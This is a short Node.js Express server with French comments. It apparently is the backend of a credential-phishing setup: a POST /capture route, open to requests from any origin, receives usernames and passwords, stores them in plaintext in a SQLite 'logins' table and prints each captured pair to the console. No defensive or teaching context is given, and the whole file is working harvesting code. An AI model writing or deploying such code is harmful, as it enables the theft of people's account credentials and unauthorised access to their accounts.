const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const sqlite3 = require("sqlite3").verbose();

const app = express();
const port = 5002;

// Base de données SQLite (stockage local)
const db = new sqlite3.Database("data.db", (err) => {
  if (err) {
    console.error("Erreur de connexion à la base de données:", err.message);
    return;
  }
  console.log("Base de données connectée !");
});

// Création de la table si elle n'existe pas
db.run(
  `
  CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
  );
`,
  (err) => {
    if (err) {
      console.error("Erreur lors de la création de la table:", err.message);
    } else {
      console.log("Table 'logins' prête !");
    }
  }
);


app.use(cors());
app.use(bodyParser.json());

// Route pour capturer les identifiants
app.post("/capture", (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Données manquantes." });
  }

  // Insertion des données dans la base de données
  db.run(
    `INSERT INTO logins (username, password) VALUES (?, ?)`,
    [username, password],
    function (err) {
      if (err) {
        console.error("Erreur lors de l'insertion des données:", err.message);
        return res
          .status(500)
          .json({ success: false, message: "Erreur serveur." });
      }
      console.log(`Identifiants capturés : ${username} / ${password}`);
      res.json({ success: true, message: "Identifiants enregistrés." });
    }
  );
});

// Lancer le serveur
app.listen(port, () => {
  console.log(`Serveur en écoute sur http://localhost:${port}`);
});
